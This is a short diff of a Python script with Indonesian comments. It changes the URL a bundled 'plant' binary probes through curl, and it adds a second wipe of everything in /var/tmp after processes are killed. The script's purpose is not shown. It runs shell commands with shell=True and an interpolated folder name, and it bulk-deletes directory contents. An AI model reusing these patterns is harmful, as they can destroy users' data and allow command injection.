@@ -156,7 +156,7 @@ def check_folder():
 def check_ip(folder):
     try:
         # Url
-        url = 'https://jsonapi.org/'
+        url = 'https://www.json.org/json-en.html'
         # Membuat subprocess untuk menjalankan curl command
         curl_command = f"./{folder}/plant/plant curl -s -o /dev/null -w '%{{http_code}}' {url}"
         result = subprocess.run(curl_command, shell=True, capture_output=True, text=True, timeout=10)
@@ -218,6 +218,7 @@ def reset():
     kill_processes()
     delete_all_in_current_location()
     os.chdir("/var/tmp")
+    delete_all_in_current_location()
     # make folder
     run_bash_command(f"mkdir -p {args.folder}")
     command_folder = f"cd {args.folder} && "
